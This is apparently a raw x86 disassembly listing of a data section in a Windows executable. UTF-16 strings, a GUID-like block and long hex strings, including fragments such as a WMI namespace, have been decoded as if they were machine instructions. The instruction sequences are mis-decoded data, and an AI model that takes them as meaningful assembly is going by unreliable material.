  4056c2:	ins    DWORD PTR es:[edi],dx
  4056c3:	add    BYTE PTR [ebp+0x0],ah
  4056c6:	push   ebx
  4056c7:	add    BYTE PTR [eax+0x0],dh
  4056ca:	popa   
  4056cb:	add    BYTE PTR [ebx+0x0],ah
  4056ce:	add    BYTE PTR gs:[eax],al
  4056d1:	pop    ss
  4056d2:	add    BYTE PTR [di+0x0],ah
  4056d6:	outs   dx,BYTE PTR ds:[esi]
  4056d7:	add    BYTE PTR [eax+eax*1+0x61],cl
  4056db:	add    BYTE PTR [esi+0x0],ch
  4056de:	add    BYTE PTR [di+0x0],dh
  4056e2:	popa   
  4056e3:	add    BYTE PTR [edi+0x0],ah
  4056e6:	add    BYTE PTR gs:[eax],al
  4056e9:	or     eax,0x730063
  4056ee:	dec    esp
  4056ef:	add    BYTE PTR [ecx+0x0],ah
  4056f2:	outs   dx,BYTE PTR ds:[esi]
  4056f3:	add    BYTE PTR [edi+0x0],ah
  4056f6:	add    BYTE PTR ds:0x620076,cl
  4056fc:	dec    esp
  4056fd:	add    BYTE PTR [ecx+0x0],ah
  405700:	outs   dx,BYTE PTR ds:[esi]
  405701:	add    BYTE PTR [edi+0x0],ah
  405704:	add    BYTE PTR ds:0x73006a,cl
  40570a:	dec    esp
  40570b:	add    BYTE PTR [ecx+0x0],ah
  40570e:	outs   dx,BYTE PTR ds:[esi]
  40570f:	add    BYTE PTR [edi+0x0],ah
  405712:	add    BYTE PTR ds:0x6a0076,cl
  405718:	dec    esp
  405719:	add    BYTE PTR [ecx+0x0],ah
  40571c:	outs   dx,BYTE PTR ds:[esi]
  40571d:	add    BYTE PTR [edi+0x0],ah
  405720:	add    BYTE PTR ds:0x63006d,cl
  405726:	dec    esp
  405727:	add    BYTE PTR [ecx+0x0],ah
  40572a:	outs   dx,BYTE PTR ds:[esi]
  40572b:	add    BYTE PTR [edi+0x0],ah
  40572e:	add    BYTE PTR [ecx],dl
  405730:	data16 add BYTE PTR [ecx+0x0],ch
  405734:	ins    BYTE PTR es:[edi],dx
  405735:	add    BYTE PTR [ebp+0x0],ah
  405738:	push   eax
  405739:	add    BYTE PTR [ecx+0x0],ah
  40573c:	je     0x40573e
  40573e:	push   0x6d0f0000
  405743:	add    BYTE PTR [ecx+0x0],ah
  405746:	arpl   WORD PTR [eax],ax
  405748:	push   0x6e006900
  40574d:	add    BYTE PTR [ebp+0x0],ah
  405750:	add    BYTE PTR [ecx],cl
  405752:	jne    0x405754
  405754:	jae    0x405756
  405756:	add    BYTE PTR gs:[edx+0x0],dh
  40575a:	add    BYTE PTR [ecx],dl
  40575c:	jo     0x40575e
  40575e:	popa   
  40575f:	add    BYTE PTR [ebx+0x0],dh
  405762:	jae    0x405764
  405764:	ja     0x405766
  405766:	outs   dx,DWORD PTR ds:[esi]
  405767:	add    BYTE PTR [edx+0x0],dh
  40576a:	add    BYTE PTR fs:[eax],al
  40576d:	adc    eax,0x790073
  405772:	outs   dx,BYTE PTR ds:[esi]
  405773:	add    BYTE PTR [eax+eax*1+0x61],dh
  405777:	add    BYTE PTR [eax+0x0],bh
  40577a:	dec    eax
  40577b:	add    BYTE PTR [ebp+0x0],ah
  40577e:	ins    BYTE PTR es:[edi],dx
  40577f:	add    BYTE PTR [eax+0x0],dh
  405782:	add    BYTE PTR [edi],cl
  405784:	add    BYTE PTR gs:[eax+0x0],bh
  405788:	popa   
  405789:	add    BYTE PTR [ebp+0x0],ch
  40578c:	jo     0x40578e
  40578e:	ins    BYTE PTR es:[edi],dx
  40578f:	add    BYTE PTR [ebp+0x0],ah
  405792:	add    BYTE PTR [eax+0x4d00099b],al
  405798:	add    BYTE PTR [edi+0x0],ah
  40579b:	ins    DWORD PTR es:[edi],dx
  40579c:	add    BYTE PTR [eax+eax*1+0x63],dh
  4057a0:	add    BYTE PTR [eax+eax*1+0x61],ch
  4057a4:	add    BYTE PTR [ebx+0x0],dh
  4057a7:	jae    0x4057a9
  4057a9:	inc    edi
  4057aa:	add    BYTE PTR [ebp+0x0],ah
  4057ad:	outs   dx,BYTE PTR ds:[esi]
  4057ae:	add    BYTE PTR [eax],ah
  4057b0:	add    BYTE PTR [edi+0x0],dl
  4057b3:	imul   eax,DWORD PTR [eax],0x33006e
  4057b9:	xor    al,BYTE PTR [eax]
  4057bb:	pop    edi
  4057bc:	add    BYTE PTR [eax+eax*1+0x6f],cl
  4057c0:	add    BYTE PTR [edi+0x0],ah
  4057c3:	imul   eax,DWORD PTR [eax],0x610063
  4057c9:	ins    BYTE PTR es:[edi],dx
  4057ca:	add    BYTE PTR [eax+eax*1+0x69],ah
  4057ce:	add    BYTE PTR [ebx+0x0],dh
  4057d1:	imul   eax,DWORD PTR [eax],0x20
  4057d4:	add    BYTE PTR [edi],ch
  4057d6:	add    BYTE PTR [eax+eax*1+0x20],cl
  4057da:	add    BYTE PTR [esi+0x0],dl
  4057dd:	inc    edx
  4057de:	add    BYTE PTR [eax],ah
  4057e0:	add    BYTE PTR [edi],ch
  4057e2:	add    BYTE PTR [esi+0x0],cl
  4057e5:	and    BYTE PTR [eax],al
  4057e7:	jb     0x4057e9
  4057e9:	outs   dx,DWORD PTR ds:[esi]
  4057ea:	add    BYTE PTR [edi+0x0],ch
  4057ed:	je     0x4057ef
  4057ef:	pop    esp
  4057f0:	add    BYTE PTR [ebx+0x0],ah
  4057f3:	imul   eax,DWORD PTR [eax],0x76006d
  4057f9:	xor    al,BYTE PTR [eax]
  4057fb:	and    BYTE PTR [eax],al
  4057fd:	das    
  4057fe:	add    BYTE PTR [eax+0x0],dl
  405801:	and    BYTE PTR [eax],al
  405803:	arpl   WORD PTR [eax],ax
  405805:	cmp    al,BYTE PTR [eax]
  405807:	pop    esp
  405808:	add    BYTE PTR [eax+eax*1+0x65],dh
  40580c:	add    BYTE PTR [ebp+0x0],ch
  40580f:	jo     0x405811
  405811:	pop    esp
  405812:	add    BYTE PTR [eax+eax*1+0x6f],ch
  405816:	add    BYTE PTR [edi+0x0],ah
  405819:	imul   eax,DWORD PTR [eax],0x610063
  40581f:	ins    BYTE PTR es:[edi],dx
  405820:	add    BYTE PTR [eax+eax*1+0x69],ah
  405824:	add    BYTE PTR [ebx+0x0],dh
  405827:	imul   eax,DWORD PTR [eax],0x2e
  40582a:	add    BYTE PTR [esi+0x0],dh
  40582d:	bound  eax,QWORD PTR [eax]
  40582f:	add    BYTE PTR [edi],al
  405831:	add    BYTE PTR cs:[ebx+0x0],al
  405835:	push   ebx
  405836:	add    BYTE PTR [eax],al
  405838:	add    eax,0x420056
  40583d:	add    BYTE PTR ds:0x53004a,al
  405843:	add    BYTE PTR ds:0x4a0056,al
  405849:	add    BYTE PTR ds:0x43004d,al
  40584f:	add    BYTE PTR [edi],al
  405851:	add    BYTE PTR cs:[esi+0x0],dl
  405855:	inc    edx
  405856:	add    BYTE PTR [eax],al
  405858:	pop    es
  405859:	add    BYTE PTR cs:[edx+0x0],cl
  40585d:	push   ebx
  40585e:	add    BYTE PTR [eax],al
  405860:	or     DWORD PTR [esi],ebp
  405862:	add    BYTE PTR [edx+0x0],ch
  405865:	jae    0x405867
  405867:	ins    BYTE PTR es:[edi],dx
  405868:	add    BYTE PTR [eax],al
  40586a:	or     DWORD PTR [esi],ebp
  40586c:	add    BYTE PTR [ebx+0x0],ah
  40586f:	jo     0x405871
  405871:	jo     0x405873
  405873:	add    BYTE PTR ds:0x6e0069,bl
  405879:	jbe    0x40587b
  40587b:	popa   
  40587c:	add    BYTE PTR [eax+eax*1+0x69],ch
  405880:	add    BYTE PTR [eax+eax*1+0x4c],ah
  405884:	add    BYTE PTR [ecx+0x0],ah
  405887:	outs   dx,BYTE PTR ds:[esi]
  405888:	add    BYTE PTR [edi+0x0],ah
  40588b:	inc    ebp
  40588c:	add    BYTE PTR [edx+0x0],dh
  40588f:	jb     0x405891
  405891:	add    BYTE PTR ds:0x6f0074,ah
  405897:	outs   dx,DWORD PTR ds:[esi]
  405898:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40589c:	add    BYTE PTR [esi+0x0],ch
  40589f:	add    BYTE PTR [bp+0x0],al
  4058a3:	imul   eax,DWORD PTR [eax],0x65006c
  4058a9:	dec    esi
  4058aa:	add    BYTE PTR [ecx+0x0],ah
  4058ad:	ins    DWORD PTR es:[edi],dx
  4058ae:	add    BYTE PTR [ebp+0x0],ah
  4058b1:	inc    ebp
  4058b2:	add    BYTE PTR [edx+0x0],dh
  4058b5:	jb     0x4058b7
  4058b7:	add    BYTE PTR [ecx],ah
  4058b9:	imul   eax,DWORD PTR [eax],0x76006e
  4058bf:	popa   
  4058c0:	add    BYTE PTR [eax+eax*1+0x69],ch
  4058c4:	add    BYTE PTR [eax+eax*1+0x4e],ah
  4058c8:	add    BYTE PTR [ecx+0x0],ah
  4058cb:	ins    DWORD PTR es:[edi],dx
  4058cc:	add    BYTE PTR [ebp+0x0],ah
  4058cf:	jae    0x4058d1
  4058d1:	jo     0x4058d3
  4058d3:	popa   
  4058d4:	add    BYTE PTR [ebx+0x0],ah
  4058d7:	add    BYTE PTR gs:[eax],al
  4058da:	and    DWORD PTR [ebx+0x0],esp
  4058dd:	ins    BYTE PTR es:[edi],dx
  4058de:	add    BYTE PTR [ecx+0x0],ah
  4058e1:	jae    0x4058e3
  4058e3:	jae    0x4058e5
  4058e5:	dec    esi
  4058e6:	add    BYTE PTR [edi+0x0],ch
  4058e9:	je     0x4058eb
  4058eb:	inc    esi
  4058ec:	add    BYTE PTR [edi+0x0],ch
  4058ef:	jne    0x4058f1
  4058f1:	outs   dx,BYTE PTR ds:[esi]
  4058f2:	add    BYTE PTR [eax+eax*1+0x45],ah
  4058f6:	add    BYTE PTR [edx+0x0],dh
  4058f9:	jb     0x4058fb
  4058fb:	add    BYTE PTR ds:0x6f0072,dl
  405901:	outs   dx,DWORD PTR ds:[esi]
  405902:	add    BYTE PTR [eax+eax*1+0x5c],dh
  405906:	add    BYTE PTR [ebx+0x0],al
  405909:	imul   eax,DWORD PTR [eax],0x56006d
  40590f:	xor    al,BYTE PTR [eax]
  405911:	add    BYTE PTR [ecx],bl
  405913:	dec    ebp
  405914:	add    BYTE PTR [edi+0x0],ah
  405917:	ins    DWORD PTR es:[edi],dx
  405918:	add    BYTE PTR [eax+eax*1+0x43],dh
  40591c:	add    BYTE PTR [eax+eax*1+0x61],ch
  405920:	add    BYTE PTR [ebx+0x0],dh
  405923:	jae    0x405925
  405925:	inc    edi
  405926:	add    BYTE PTR [ebp+0x0],ah
  405929:	outs   dx,BYTE PTR ds:[esi]
  40592a:	add    BYTE PTR [eax],al
  40592c:	pop    es
  40592d:	add    BYTE PTR cs:[esi],ch
  405930:	add    BYTE PTR [esi],ch
  405932:	add    BYTE PTR [eax],al
  405934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405935:	out    0x9f,al
  405937:	sbb    BYTE PTR [esi-0x55],0x47
  40593b:	inc    esp
  40593c:	test   DWORD PTR [edi],eax
  40593e:	lods   al,BYTE PTR ds:[esi]
  40593f:	and    bl,BYTE PTR [edi-0x5b]
  405942:	mov    ah,0xe2
  405944:	add    BYTE PTR [eax],cl
  405946:	mov    bh,0x7a
  405948:	pop    esp
  405949:	push   esi
  40594a:	sbb    DWORD PTR [eax+eiz*8],esi
  40594d:	mov    DWORD PTR [ebx],eax
  40594f:	and    BYTE PTR [eax],al
  405951:	add    DWORD PTR [edx],eax
  405953:	push   es
  405954:	push   cs
  405955:	add    eax,DWORD PTR [esi]
  405957:	adc    cl,BYTE PTR [ebx+eax*1]
  40595a:	push   es
  40595b:	adc    dl,BYTE PTR [ecx]
  40595d:	add    eax,DWORD PTR [esi]
  40595f:	adc    dl,BYTE PTR ds:0x8010005
  405965:	sbb    eax,0x30e
  40596a:	or     BYTE PTR [eax],cl
  40596c:	mov    al,0x3f
  40596e:	pop    edi
  40596f:	jg     0x405982
  405971:	aad    0xa
  405973:	cmp    cl,BYTE PTR [edx]
  405975:	add    BYTE PTR [edx+eax*1],al
  405978:	push   cs
  405979:	adc    BYTE PTR [esi],cl
  40597b:	push   cs
  40597c:	adc    BYTE PTR [ecx],dl
  40597e:	sbb    DWORD PTR [esi],eax
  405980:	add    BYTE PTR [ecx],al
  405982:	add    dl,BYTE PTR [eax]
  405984:	adc    bl,BYTE PTR ds:0x1000003
  40598a:	add    eax,DWORD PTR [esi]
  40598c:	sbb    eax,0x12060305
  405991:	and    DWORD PTR [eax+eiz*1],eax
  405994:	add    DWORD PTR [ecx],eax
  405996:	push   cs
  405997:	add    esp,DWORD PTR [eax]
  405999:	add    BYTE PTR [esi],cl
  40599b:	push   cs
  40599c:	xor    al,0x0
  40599e:	add    BYTE PTR cs:[eax],dh
  4059a1:	add    BYTE PTR [esi],ch
  4059a3:	add    BYTE PTR [eax],dh
  4059a5:	add    BYTE PTR [esi],ch
  4059a7:	add    BYTE PTR [eax],dh
  4059a9:	add    BYTE PTR [eax],ah
  4059ab:	dec    ebp
  4059ac:	add    BYTE PTR [edi+0x0],ah
  4059af:	ins    DWORD PTR es:[edi],dx
  4059b0:	add    BYTE PTR [eax+eax*1+0x43],dh
  4059b4:	add    BYTE PTR [eax+eax*1+0x61],ch
  4059b8:	add    BYTE PTR [ebx+0x0],dh
  4059bb:	jae    0x4059bd
  4059bd:	inc    edi
  4059be:	add    BYTE PTR [ebp+0x0],ah
  4059c1:	outs   dx,BYTE PTR ds:[esi]
  4059c2:	add    BYTE PTR [esi],ch
  4059c4:	add    BYTE PTR [ebp+0x0],ah
  4059c7:	js     0x4059c9
  4059c9:	add    BYTE PTR gs:[ecx+ebp*4+0x0],bl
  4059ce:	and    BYTE PTR [eax],al
  4059d0:	dec    ebp
  4059d1:	add    BYTE PTR [ecx+0x0],ch
  4059d4:	arpl   WORD PTR [eax],ax
  4059d6:	jb     0x4059d8
  4059d8:	outs   dx,DWORD PTR ds:[esi]
  4059d9:	add    BYTE PTR [ebx+0x0],dh
  4059dc:	outs   dx,DWORD PTR ds:[esi]
  4059dd:	add    BYTE PTR [esi+0x0],ah
  4059e0:	je     0x4059e2
  4059e2:	and    BYTE PTR [eax],al
  4059e4:	inc    ebx
  4059e5:	add    BYTE PTR [edi+0x0],ch
  4059e8:	jb     0x4059ea
  4059ea:	jo     0x4059ec
  4059ec:	outs   dx,DWORD PTR ds:[esi]
  4059ed:	add    BYTE PTR [edx+0x0],dh
  4059f0:	popa   
  4059f1:	add    BYTE PTR [eax+eax*1+0x69],dh
  4059f5:	add    BYTE PTR [edi+0x0],ch
  4059f8:	outs   dx,BYTE PTR ds:[esi]
  4059f9:	add    BYTE PTR [esi],ch
  4059fb:	add    BYTE PTR [eax],ah
  4059fd:	add    BYTE PTR [eax],ah
  4059ff:	add    BYTE PTR [ecx+0x0],al
  405a02:	ins    BYTE PTR es:[edi],dx
  405a03:	add    BYTE PTR [eax+eax*1+0x20],ch
  405a07:	add    BYTE PTR [edx+0x0],dh
  405a0a:	imul   eax,DWORD PTR [eax],0x680067
  405a10:	je     0x405a12
  405a12:	jae    0x405a14
  405a14:	and    BYTE PTR [eax],al
  405a16:	jb     0x405a18
  405a18:	add    BYTE PTR gs:[ebx+0x0],dh
  405a1c:	add    BYTE PTR gs:[edx+0x0],dh
  405a20:	jbe    0x405a22
  405a22:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  405a27:	add    BYTE PTR [esi],bl
  405a29:	xor    al,0x0
  405a2b:	add    BYTE PTR cs:[eax],dh
  405a2e:	add    BYTE PTR [esi],ch
  405a30:	add    BYTE PTR [ebx],dh
  405a32:	add    BYTE PTR [eax],dh
  405a34:	add    BYTE PTR [ebx],dh
  405a36:	add    BYTE PTR [ecx],dh
  405a38:	add    BYTE PTR [ecx],bh
  405a3a:	add    BYTE PTR [esi],ch
  405a3c:	add    BYTE PTR [ecx],dh
  405a3e:	add    BYTE PTR [edi],dh
  405a40:	add    BYTE PTR [ecx],bh
  405a42:	add    BYTE PTR [edx],dh
  405a44:	add    BYTE PTR [ecx],bh
  405a46:	add    BYTE PTR [edx],cl
  405a48:	xor    eax,DWORD PTR [eax]
  405a4a:	xor    BYTE PTR [eax],al
  405a4c:	xor    eax,DWORD PTR [eax]
  405a4e:	xor    DWORD PTR [eax],eax
  405a50:	cmp    DWORD PTR [eax],eax
  405a52:	or     dh,BYTE PTR [ecx]
  405a54:	add    BYTE PTR [edi],dh
  405a56:	add    BYTE PTR [ecx],bh
  405a58:	add    BYTE PTR [edx],dh
  405a5a:	add    BYTE PTR [ecx],bh
  405a5c:	add    BYTE PTR [edx],al
  405a5e:	push   es
  405a5f:	or     BYTE PTR [edi+ebp*2],al
  405a62:	jbe    0x405a64
  405a64:	add    BYTE PTR [eax],ah
  405a66:	bound  eax,QWORD PTR [eax]
  405a68:	aaa    
  405a69:	add    BYTE PTR [edi],dh
  405a6b:	add    BYTE PTR [ecx+0x0],ah
  405a6e:	xor    eax,0x35006300
  405a73:	add    BYTE PTR [esi],dh
  405a75:	add    BYTE PTR [ecx],dh
  405a77:	add    BYTE PTR [ecx],bh
  405a79:	add    BYTE PTR [ebx],dh
  405a7b:	add    BYTE PTR [eax+eax*1],dh
  405a7e:	add    BYTE PTR gs:[eax],dh
  405a81:	add    BYTE PTR [eax],bh
  405a83:	add    BYTE PTR [ecx],bh
  405a85:	add    BYTE PTR [eax+0x30],al
  405a88:	add    BYTE PTR [eax],dh
  405a8a:	add    BYTE PTR [eax],dh
  405a8c:	add    BYTE PTR [eax],dh
  405a8e:	add    BYTE PTR [eax],dh
  405a90:	add    BYTE PTR [eax],dh
  405a92:	add    BYTE PTR [eax],dh
  405a94:	add    BYTE PTR [eax],dh
  405a96:	add    BYTE PTR [eax],dh
  405a98:	add    BYTE PTR [eax],dh
  405a9a:	add    BYTE PTR [eax],dh
  405a9c:	add    BYTE PTR [eax],dh
  405a9e:	add    BYTE PTR [eax],dh
  405aa0:	add    BYTE PTR [eax],dh
  405aa2:	add    BYTE PTR [eax],dh
  405aa4:	add    BYTE PTR [eax],dh
  405aa6:	add    BYTE PTR [eax],dh
  405aa8:	add    BYTE PTR [eax+eax*1],dh
  405aab:	xor    BYTE PTR [eax],al
  405aad:	xor    BYTE PTR [eax],al
  405aaf:	xor    BYTE PTR [eax],al
  405ab1:	xor    BYTE PTR [eax],al
  405ab3:	xor    BYTE PTR [eax],al
  405ab5:	xor    BYTE PTR [eax],al
  405ab7:	xor    BYTE PTR [eax],al
  405ab9:	xor    BYTE PTR [eax],al
  405abb:	xor    BYTE PTR [eax],al
  405abd:	xor    BYTE PTR [eax],al
  405abf:	xor    BYTE PTR [eax],al
  405ac1:	xor    BYTE PTR [eax],al
  405ac3:	xor    BYTE PTR [eax],al
  405ac5:	xor    BYTE PTR [eax],al
  405ac7:	and    BYTE PTR [ebx],dh
  405ac9:	add    BYTE PTR [ecx],dh
  405acb:	add    BYTE PTR [edx+0x0],ah
  405ace:	data16 add BYTE PTR [ebx],dh
  405ad1:	add    BYTE PTR [eax],bh
  405ad3:	add    BYTE PTR ds:0x61003600,dh
  405ad9:	add    BYTE PTR [eax+eax*1+0x33],ah
  405add:	add    BYTE PTR [esi],dh
  405adf:	add    BYTE PTR [eax+eax*1],dh
  405ae2:	add    BYTE PTR gs:[ebx],dh
  405ae5:	add    BYTE PTR ds:0x30808200,dh
  405aeb:	add    BYTE PTR [eax],dh
  405aed:	add    BYTE PTR [edx],dh
  405aef:	add    BYTE PTR [eax+eax*1],dh
  405af2:	xor    BYTE PTR [eax],al
  405af4:	xor    BYTE PTR [eax],al
  405af6:	xor    BYTE PTR [eax],al
  405af8:	xor    BYTE PTR [eax],al
  405afa:	xor    BYTE PTR [eax],al
  405afc:	xor    al,0x0
  405afe:	cmp    BYTE PTR [eax],al
  405b00:	xor    BYTE PTR [eax],al
  405b02:	xor    BYTE PTR [eax],al
  405b04:	xor    BYTE PTR [eax],al
  405b06:	xor    BYTE PTR [eax],al
  405b08:	xor    BYTE PTR [eax],al
  405b0a:	cmp    DWORD PTR [eax],eax
  405b0c:	xor    al,0x0
  405b0e:	xor    BYTE PTR [eax],al
  405b10:	xor    BYTE PTR [eax],al
  405b12:	xor    BYTE PTR [eax],al
  405b14:	xor    BYTE PTR [eax],al
  405b16:	xor    BYTE PTR [eax],al
  405b18:	xor    BYTE PTR [eax],al
  405b1a:	xor    BYTE PTR [eax],al
  405b1c:	add    BYTE PTR ss:[eax],dh
  405b1f:	add    BYTE PTR [edx],dh
  405b21:	add    BYTE PTR [eax],dh
  405b23:	add    BYTE PTR [eax],dh
  405b25:	add    BYTE PTR [eax],dh
  405b27:	add    BYTE PTR [eax],dh
  405b29:	add    BYTE PTR [eax],dh
  405b2b:	add    BYTE PTR [eax],dh
  405b2d:	add    BYTE PTR [edx],dh
  405b2f:	add    BYTE PTR [eax+eax*1],dh
  405b32:	xor    BYTE PTR [eax],al
  405b34:	xor    BYTE PTR [eax],al
  405b36:	xor    BYTE PTR [eax],al
  405b38:	xor    BYTE PTR [eax],al
  405b3a:	xor    eax,0x35003200
  405b3f:	add    BYTE PTR [ebx],dh
  405b41:	add    BYTE PTR [eax+eax*1],dh
  405b44:	xor    DWORD PTR [eax],eax
  405b46:	xor    eax,DWORD PTR [eax]
  405b48:	xor    DWORD PTR [eax],eax
  405b4a:	xor    BYTE PTR [eax],al
  405b4c:	xor    BYTE PTR [eax],al
  405b4e:	xor    BYTE PTR [eax],al
  405b50:	xor    al,0x0
  405b52:	xor    BYTE PTR [eax],al
  405b54:	xor    BYTE PTR [eax],al
  405b56:	xor    BYTE PTR [eax],al
  405b58:	xor    BYTE PTR [eax],al
  405b5a:	xor    BYTE PTR [eax],al
  405b5c:	xor    DWORD PTR [eax],eax
  405b5e:	xor    BYTE PTR [eax],al
  405b60:	xor    BYTE PTR [eax],al
  405b62:	xor    BYTE PTR [eax],al
  405b64:	xor    DWORD PTR [eax],eax
  405b66:	xor    BYTE PTR [eax],al
  405b68:	xor    BYTE PTR [eax],al
  405b6a:	inc    edx
  405b6b:	add    BYTE PTR ds:0x43004600,dh
  405b71:	add    BYTE PTR [ecx],bh
  405b73:	add    BYTE PTR [eax],dh
  405b75:	add    BYTE PTR [ebp+0x0],al
  405b78:	aaa    
  405b79:	add    BYTE PTR [eax],dh
  405b7b:	add    BYTE PTR [edx],dh
  405b7d:	add    BYTE PTR [edi],dh
  405b7f:	add    BYTE PTR [esi+0x0],al
  405b82:	add    BYTE PTR ss:[edi],dh
  405b85:	add    BYTE PTR [eax],bh
  405b87:	add    BYTE PTR [edi],dh
  405b89:	add    BYTE PTR [ecx],dh
  405b8b:	add    BYTE PTR [ebp+0x0],al
  405b8e:	aaa    
  405b8f:	add    BYTE PTR [edi],dh
  405b91:	add    BYTE PTR [ebx],dh
  405b93:	add    BYTE PTR [ecx+0x0],al
  405b96:	cmp    BYTE PTR [eax],al
  405b98:	inc    esi
  405b99:	add    BYTE PTR [eax+eax*1+0x45],al
  405b9d:	add    BYTE PTR [eax],bh
  405b9f:	add    BYTE PTR [ecx],bh
  405ba1:	add    BYTE PTR [ebx],dh
  405ba3:	add    BYTE PTR [eax],bh
  405ba5:	add    BYTE PTR [ebx+0x0],al
  405ba8:	cmp    BYTE PTR [eax],al
  405baa:	xor    DWORD PTR [eax],eax
  405bac:	inc    esp
  405bad:	add    BYTE PTR [eax+eax*1+0x34],al
  405bb1:	add    BYTE PTR [eax],dh
  405bb3:	add    BYTE PTR [edx],dh
  405bb5:	add    BYTE PTR [edx+0x0],al
  405bb8:	inc    ecx
  405bb9:	add    BYTE PTR [esi],dh
  405bbb:	add    BYTE PTR ds:0x39004200,dh
  405bc1:	add    BYTE PTR [edx],dh
  405bc3:	add    BYTE PTR [eax],dh
  405bc5:	add    BYTE PTR [ecx],dh
  405bc7:	add    BYTE PTR [eax+eax*1+0x36],al
  405bcb:	add    BYTE PTR [eax],dh
  405bcd:	add    BYTE PTR ds:0x33003900,dh
  405bd3:	add    BYTE PTR [ebp+0x0],al
  405bd6:	cmp    DWORD PTR [eax],eax
  405bd8:	add    BYTE PTR ss:[ebx+0x0],al
  405bdc:	xor    al,0x0
  405bde:	cmp    DWORD PTR [eax],eax
  405be0:	xor    al,BYTE PTR [eax]
  405be2:	add    BYTE PTR ss:0x45003100,dh
  405be9:	add    BYTE PTR [eax],bh
  405beb:	add    BYTE PTR [eax],bh
  405bed:	add    BYTE PTR [ecx],bh
  405bef:	add    BYTE PTR [ebx+0x0],al
  405bf2:	inc    ebx
  405bf3:	add    BYTE PTR [ecx],dh
  405bf5:	add    BYTE PTR [ebx],dh
  405bf7:	add    BYTE PTR [esi+0x0],al
  405bfa:	xor    DWORD PTR [eax],eax
  405bfc:	xor    al,0x0
  405bfe:	xor    DWORD PTR [eax],eax
  405c00:	xor    eax,0x42004500
  405c05:	add    BYTE PTR [edx+0x0],al
  405c08:	xor    eax,0x46003300
  405c0d:	add    BYTE PTR [ecx+0x0],al
  405c10:	inc    ebx
  405c11:	add    BYTE PTR [ecx],dh
  405c13:	add    BYTE PTR [ecx],dh
  405c15:	add    BYTE PTR [ebx],dh
  405c17:	add    BYTE PTR [ecx],dh
  405c19:	add    BYTE PTR [ecx+0x0],al
  405c1c:	inc    ebp
  405c1d:	add    BYTE PTR [eax],dh
  405c1f:	add    BYTE PTR [edx+0x0],al
  405c22:	inc    esp
  405c23:	add    BYTE PTR [ebx],dh
  405c25:	add    BYTE PTR [ebx],dh
  405c27:	add    BYTE PTR [ebx],dh
  405c29:	add    BYTE PTR [ebx+0x0],al
  405c2c:	xor    eax,0x45004500
  405c31:	add    BYTE PTR [esi],dh
  405c33:	add    BYTE PTR [eax],dh
  405c35:	add    BYTE PTR [edx],dh
  405c37:	add    BYTE PTR [ecx],dh
  405c39:	add    BYTE PTR [esi],dh
  405c3b:	add    BYTE PTR [edi],dh
  405c3d:	add    BYTE PTR [edx],dh
  405c3f:	add    BYTE PTR [eax+eax*1+0x39],al
  405c43:	add    BYTE PTR [edi],dh
  405c45:	add    BYTE PTR [ecx],dh
  405c47:	add    BYTE PTR [eax],bh
  405c49:	add    BYTE PTR [ebp+0x0],al
  405c4c:	inc    ecx
  405c4d:	add    BYTE PTR [ebx],dh
  405c4f:	add    BYTE PTR [ecx],dh
  405c51:	add    BYTE PTR [ecx+0x0],al
  405c54:	cmp    BYTE PTR [eax],al
  405c56:	inc    ecx
  405c57:	add    BYTE PTR [ebp+0x0],al
  405c5a:	inc    edx
  405c5b:	add    BYTE PTR [eax+eax*1+0x30],al
  405c5f:	add    BYTE PTR [eax+eax*1+0x41],al
  405c63:	add    BYTE PTR [eax],dh
  405c65:	add    BYTE PTR [eax],dh
  405c67:	add    BYTE PTR [edi],dh
  405c69:	add    BYTE PTR [edx],dh
  405c6b:	add    BYTE PTR [esi+0x0],al
  405c6e:	xor    al,BYTE PTR [eax]
  405c70:	xor    eax,0x38004400
  405c75:	add    BYTE PTR [edi],dh
  405c77:	add    BYTE PTR [eax+eax*1+0x42],al
  405c7b:	add    BYTE PTR [ecx+0x0],al
  405c7e:	add    BYTE PTR ss:[esi+0x0],al
  405c82:	inc    ebx
  405c83:	add    BYTE PTR [ecx],bh
  405c85:	add    BYTE PTR [eax],dh
  405c87:	add    BYTE PTR [esi+0x0],al
  405c8a:	inc    esi
  405c8b:	add    BYTE PTR [eax+eax*1+0x35],al
  405c8f:	add    BYTE PTR [ecx],bh
  405c91:	add    BYTE PTR [eax],bh
  405c93:	add    BYTE PTR [ebp+0x0],al
  405c96:	inc    esp
  405c97:	add    BYTE PTR [eax+eax*1],dh
  405c9a:	inc    esp
  405c9b:	add    BYTE PTR [ecx+0x0],al
  405c9e:	xor    eax,DWORD PTR [eax]
  405ca0:	xor    eax,0x34004500
  405ca5:	add    BYTE PTR [eax+eax*1],dh
  405ca8:	inc    ebx
  405ca9:	add    BYTE PTR [ebx],dh
  405cab:	add    BYTE PTR [ecx],bh
  405cad:	add    BYTE PTR [eax],bh
  405caf:	add    BYTE PTR [ebx+0x0],al
  405cb2:	xor    al,0x0
  405cb4:	xor    eax,0x33003400
  405cb9:	add    BYTE PTR [eax],dh
  405cbb:	add    BYTE PTR [edi],dh
  405cbd:	add    BYTE PTR [ebp+0x0],al
  405cc0:	cmp    BYTE PTR [eax],al
  405cc2:	inc    ebp
  405cc3:	add    BYTE PTR [ebx],dh
  405cc5:	add    BYTE PTR [ebx],dh
  405cc7:	add    BYTE PTR [edx+0x0],al
  405cca:	cmp    BYTE PTR [eax],al
  405ccc:	xor    al,0x0
  405cce:	xor    al,BYTE PTR [eax]
  405cd0:	add    BYTE PTR ss:[ecx],dh
  405cd3:	add    BYTE PTR [eax+eax*1],dh
  405cd6:	xor    eax,DWORD PTR [eax]
  405cd8:	inc    esp
  405cd9:	add    BYTE PTR [ecx+0x0],al
  405cdc:	inc    ebp
  405cdd:	add    BYTE PTR [ebx+0x0],al
  405ce0:	cmp    DWORD PTR [eax],eax
  405ce2:	inc    esi
  405ce3:	add    BYTE PTR ds:0x36003900,dh
  405ce9:	add    BYTE PTR [eax],bh
  405ceb:	add    BYTE PTR [ebx],dh
  405ced:	add    BYTE PTR [esi],dh
  405cef:	add    BYTE PTR [esi+0x0],al
  405cf2:	cmp    DWORD PTR [eax],eax
  405cf4:	aaa    
  405cf5:	add    BYTE PTR [ebx+0x0],al
  405cf8:	cmp    BYTE PTR [eax],al
  405cfa:	inc    esi
  405cfb:	add    BYTE PTR [edi],dh
  405cfd:	add    BYTE PTR [eax+eax*1],dh
  405d00:	aaa    
  405d01:	add    BYTE PTR ds:0x45003000,dh
  405d07:	add    BYTE PTR ds:0x37003900,dh
  405d0d:	add    BYTE PTR ds:0x36004300,dh
  405d13:	add    BYTE PTR [eax+eax*1],dh
